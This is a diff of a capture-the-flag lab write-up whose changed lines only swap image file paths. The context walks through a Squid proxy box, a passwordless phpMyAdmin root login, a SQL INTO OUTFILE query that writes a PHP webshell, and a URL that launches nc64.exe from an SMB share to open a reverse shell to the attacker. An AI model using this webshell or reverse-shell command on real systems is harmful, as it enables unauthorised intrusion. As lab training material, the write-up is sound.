@@ -20,7 +20,7 @@ Only one port is open.
 
 The port was a Squid Proxy instance. When visited in a browser, this is all we see:
 
-![](<../../../.gitbook/assets/image%20(1720).png>)
+![](../../../.gitbook/assets/squid-4.png)
 
 Since this is a proxy service, it might be the gateway that we need to access the services running on the machine itself. To scan the machine, we can include this line in our `/etc/proxychains4.conf` file:
 
@@ -30,31 +30,31 @@ socks5 192.168.233.189 3128
 
 Afterwards, we can use `proxychains` to scan the machine again to find more ports that are open,  but this takes far too long. Instead, we can use FoxyProxy to attempt to view some interesting ports. I tried with a few ports like 80, 443 and 8080 for websites, and found a service on port 8080.
 
-![](<../../../.gitbook/assets/image%20(1658).png>)
+![](../../../.gitbook/assets/squid-3.png)
 
 ### Default Creds -> SQL RCE
 
 There's a PHPMyAdmin instance present on the page, and we can login using `root` as the username with no password.
 
-![](<../../../.gitbook/assets/image%20(2202).png>)
+![](../../../.gitbook/assets/squid-5.png)
 
 Since this is already the administrative interface, we can get a shell by creating a database and then executing some SQL commands in it via the web SQL interpreter.
 
-![](<../../../.gitbook/assets/image%20(971).png>)
+![](../../../.gitbook/assets/squid-10.png)
 
 Afterwards, we can select this database and head to the QUERY tab:
 
-![](<../../../.gitbook/assets/image%20(2609).png>)
+![](../../../.gitbook/assets/squid-6.png)
 
 We can test it with any query and see that it is indeed processing SQL queries:
 
-![](<../../../.gitbook/assets/image%20(3448).png>)
+![](../../../.gitbook/assets/squid-8.png)
 
 Since we can submit queries, we can also write files into the file system of the machine. I wanted to write a basic PHP webshell, but this means we need to know the webroot file. Very conveniently, there's a `phpinfo` page on the main Wampserver page.
 
 There, we can find the `DOCUMENT_ROOT`:
 
-![](<../../../.gitbook/assets/image%20(3249).png>)
+![](../../../.gitbook/assets/squid-7.png)
 
 We can then use this query to write a webshell onto the machine:
 
@@ -62,11 +62,11 @@ We can then use this query to write a webshell onto the machine:
 SELECT '<?php system($_GET["cmd"]); ?>' into outfile "C:\\wamp\\www\\backdoor.php"
 ```
 
-![](<../../../.gitbook/assets/image%20(1307).png>)
+![](../../../.gitbook/assets/squid-2.png)
 
 Afterwards, we can test our RCE:
 
-![](<../../../.gitbook/assets/image%20(3951).png>)
+![](../../../.gitbook/assets/squid-9.png)
 
 Great! No all we need to do is get a reverse shell as the user. By setting up a SMB server on our machine with `nc64.exe` within the directory, we can send this to get a shell:
 
@@ -74,7 +74,7 @@ Great! No all we need to do is get a reverse shell as the user. By setting up a 
 http://192.168.233.189:8080/backdoor.php?cmd=\\192.168.45.161\share\nc64.exe+-e+cmd.exe+192.168.45.161+4444
 ```
 
-![](<../../../.gitbook/assets/image%20(1207).png>)
+![](../../../.gitbook/assets/squid-1.png)
 
 There is no privilege escalation, because we have successfully gotten a SYSTEM shell.
 
